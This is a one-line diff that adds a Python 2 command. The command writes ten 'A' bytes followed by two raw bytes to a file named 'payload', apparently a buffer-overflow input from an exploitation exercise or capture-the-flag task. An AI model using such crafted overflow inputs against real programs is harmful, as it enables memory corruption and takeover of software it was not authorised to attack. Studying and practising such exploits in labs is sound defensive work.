@@ -1,0 +1,1 @@
+python -c 'print "A" * 10 + "\xbe\xf1"' > payload
